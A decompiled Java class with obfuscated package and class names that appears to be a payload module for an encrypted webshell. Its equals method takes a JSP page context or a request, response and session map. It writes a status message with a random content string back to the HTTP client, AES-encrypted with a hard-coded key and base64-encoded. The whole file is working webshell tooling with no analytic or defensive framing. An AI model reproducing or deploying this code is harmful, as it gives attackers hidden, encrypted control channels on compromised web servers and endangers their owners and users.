/*
 * Decompiled with CFR 0.152.
 */
package net.wsuqw.xpqcr.mhqusk;

import java.lang.reflect.Method;
import java.util.LinkedHashMap;
import java.util.Map;
import java.util.Random;
import javax.crypto.Cipher;
import javax.crypto.spec.SecretKeySpec;

public class Hqwwlygisx {
    public static String content;
    public static String payloadBody;
    private Object Request;
    private Object Response;
    private Object Session;

    public Hqwwlygisx() {
        content = "";
        content = content + "ILYnHI3SHohgYt3oLUynGeJd4oHmUAxbdV2uIkV3SHKaflK5c07PCQysMsMkucylxOsebmASFTcNr2wDqE3ILNRhr70nvlyVHreETbixdQ8F5fw3MelRtedBJFeDRIE0udgiO9ubfOs4TJ3qriiF28KLv07vXJvrMECl03SzYCk1zMvmEZ35OM2jy4g3s8xXk9zPes1u161CHFiEGHcvHsjZ18O5sv1ym8666jyeRZ1ddhZDSiSlZNTPUGs8dsl1J7vU7pLEbU79JfLPV0KvzIYkgGoeh2HJlD0XP2VdCiG6pGM5KtHmtAFCOSe1sXjsnInWgxWPvUXkZH0fqw3O0OnRL8C3BCPDaZhhs8IuVut7ZzMeCrMV0omux5SGNgtNpZd9UvZJ33BipA1u7yimtjISqHkjcSgX5EpasQz8pf58hBd9XxVz2AtGT2oX1fRzVWOy5mqfwoX0Y3RhDWgS1m5LzaXgFFFpm2aQ4tXMQy5Gg5CTJs1eFmkzfZ1WwJCMbeB6LBZfCffc0QogStVB9L7eGCEDZ2WZHMWuhhpQ6mdmYOCPYhStrd0fzhrVCRLTra3SB0VGRzD9PMyoMGoJ1lQB5Ue9UB";
    }

    /*
     * WARNING - Removed try catching itself - possible behaviour change.
     * Loose catch block
     */
    public boolean equals(Object obj) {
        block10: {
            LinkedHashMap<String, String> result = new LinkedHashMap<String, String>();
            this.fillContext(obj);
            result.put("status", "success");
            result.put("msg", content);
            try {
                Object so = this.Response.getClass().getMethod("getOutputStream", new Class[0]).invoke(this.Response, new Object[0]);
                Method write = so.getClass().getMethod("write", byte[].class);
                write.invoke(so, new Object[]{this.Encrypt(this.buildJson(result, true).getBytes("UTF-8"))});
                so.getClass().getMethod("flush", new Class[0]).invoke(so, new Object[0]);
                so.getClass().getMethod("close", new Class[0]).invoke(so, new Object[0]);
            }
            catch (Exception e) {
                e.printStackTrace();
            }
            break block10;
            catch (Exception e) {
                try {
                    result.put("msg", e.getMessage());
                    result.put("status", "success");
                }
                catch (Throwable throwable) {
                    try {
                        Object so = this.Response.getClass().getMethod("getOutputStream", new Class[0]).invoke(this.Response, new Object[0]);
                        Method write = so.getClass().getMethod("write", byte[].class);
                        write.invoke(so, new Object[]{this.Encrypt(this.buildJson(result, true).getBytes("UTF-8"))});
                        so.getClass().getMethod("flush", new Class[0]).invoke(so, new Object[0]);
                        so.getClass().getMethod("close", new Class[0]).invoke(so, new Object[0]);
                    }
                    catch (Exception e2) {
                        e2.printStackTrace();
                    }
                    throw throwable;
                }
                try {
                    Object so = this.Response.getClass().getMethod("getOutputStream", new Class[0]).invoke(this.Response, new Object[0]);
                    Method write = so.getClass().getMethod("write", byte[].class);
                    write.invoke(so, new Object[]{this.Encrypt(this.buildJson(result, true).getBytes("UTF-8"))});
                    so.getClass().getMethod("flush", new Class[0]).invoke(so, new Object[0]);
                    so.getClass().getMethod("close", new Class[0]).invoke(so, new Object[0]);
                }
                catch (Exception e3) {
                    e3.printStackTrace();
                }
            }
        }
        return true;
    }

    private String buildJson(Map<String, String> entity, boolean encode) throws Exception {
        StringBuilder sb = new StringBuilder();
        String version = System.getProperty("java.version");
        sb.append("{");
        for (String key : entity.keySet()) {
            sb.append("\"" + key + "\":\"");
            String value = entity.get(key);
            if (encode) {
                value = this.base64encode(value.getBytes());
            }
            sb.append(value);
            sb.append("\",");
        }
        if (sb.toString().endsWith(",")) {
            sb.setLength(sb.length() - 1);
        }
        sb.append("}");
        return sb.toString();
    }

    private void fillContext(Object obj) throws Exception {
        if (obj.getClass().getName().indexOf("PageContext") >= 0) {
            this.Request = obj.getClass().getMethod("getRequest", new Class[0]).invoke(obj, new Object[0]);
            this.Response = obj.getClass().getMethod("getResponse", new Class[0]).invoke(obj, new Object[0]);
            this.Session = obj.getClass().getMethod("getSession", new Class[0]).invoke(obj, new Object[0]);
        } else {
            Map objMap = (Map)obj;
            this.Session = objMap.get("session");
            this.Response = objMap.get("response");
            this.Request = objMap.get("request");
        }
        this.Response.getClass().getMethod("setCharacterEncoding", String.class).invoke(this.Response, "UTF-8");
    }

    private String base64encode(byte[] data) throws Exception {
        String result = "";
        String version = System.getProperty("java.version");
        try {
            this.getClass();
            Class<?> Base64 = Class.forName("java.util.Base64");
            Object Encoder = Base64.getMethod("getEncoder", null).invoke(Base64, null);
            result = (String)Encoder.getClass().getMethod("encodeToString", byte[].class).invoke(Encoder, new Object[]{data});
        }
        catch (Throwable error) {
            this.getClass();
            Class<?> Base64 = Class.forName("sun.misc.BASE64Encoder");
            Object Encoder = Base64.newInstance();
            result = (String)Encoder.getClass().getMethod("encode", byte[].class).invoke(Encoder, new Object[]{data});
            result = result.replace("\n", "").replace("\r", "");
        }
        return result;
    }

    private byte[] getMagic() throws Exception {
        String key = this.Session.getClass().getMethod("getAttribute", String.class).invoke(this.Session, "u").toString();
        int magicNum = Integer.parseInt(key.substring(0, 2), 16) % 16;
        Random random = new Random();
        byte[] buf = new byte[magicNum];
        for (int i = 0; i < buf.length; ++i) {
            buf[i] = (byte)random.nextInt(256);
        }
        return buf;
    }

    private byte[] Encrypt(byte[] byArray) throws Exception {
        String string = "bc2172db605712b9";
        byte[] byArray2 = string.getBytes("utf-8");
        SecretKeySpec secretKeySpec = new SecretKeySpec(byArray2, "AES");
        Cipher cipher = Cipher.getInstance("AES/ECB/PKCS5Padding");
        cipher.init(1, secretKeySpec);
        byte[] byArray3 = cipher.doFinal(byArray);
        try {
            Class<?> clazz = Class.forName("java.util.Base64");
            Object object = clazz.getMethod("getEncoder", null).invoke(clazz, null);
            byArray3 = (byte[])object.getClass().getMethod("encode", byte[].class).invoke(object, new Object[]{byArray3});
        }
        catch (Throwable throwable) {
            Class<?> clazz = Class.forName("sun.misc.BASE64Encoder");
            Object obj = clazz.newInstance();
            String string2 = (String)obj.getClass().getMethod("encode", byte[].class).invoke(obj, new Object[]{byArray3});
            string2 = string2.replace("\n", "").replace("\r", "");
            byArray3 = string2.getBytes();
        }
        return byArray3;
    }
}
